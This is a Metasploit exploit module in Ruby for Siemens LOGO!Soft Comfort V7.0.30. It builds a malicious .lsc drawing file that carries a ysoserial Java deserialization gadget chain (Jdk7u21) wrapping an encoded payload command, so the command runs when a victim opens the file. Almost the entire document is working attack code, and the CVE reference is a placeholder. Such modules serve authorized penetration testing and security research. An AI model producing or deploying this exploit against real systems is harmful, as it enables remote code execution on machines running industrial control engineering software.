class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Siemens LOGO!Soft Comfort Deserialization',
      'Description' => %q{
        LOGO!Soft Comfort parses drawing files (.lsc) that are nothing but serialized data. This module exploits the issue in LOGO!Soft Comfort V7.0.30 (2011-07-28 11-29).
      },
      'Author' =>
        [
        'mario ceballos',
        ],
      'License' => 'BSD_LICENSE',
      'References' =>
        [
          ['CVE', '0000-0000'],
        ],
      'Privileged' => false,
      'Platform' => %w{win},
      'Targets' =>
        [
          [ 'LOGO!Soft Comfort V7.0.30 (2011-07-28 11-29)',
            'Arch' => ARCH_CMD,
            'Platform' => 'win',
          ],
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => true
        },
      'DisclosureDate' => 'June 26 2020'))

    register_options(
      [
       OptString.new('FILENAME', [true, 'The file name.', 'msf.lsc']) 
      ]
    )
  end

  def exploit
   cmd = payload.encoded
   serialized_payload = Msf::Util::JavaDeserialization.ysoserial_payload('Jdk7u21',cmd) 
   print_status("Creating '#{datastore['FILENAME']}' file ...")
   file_create(serialized_payload)
  end
end
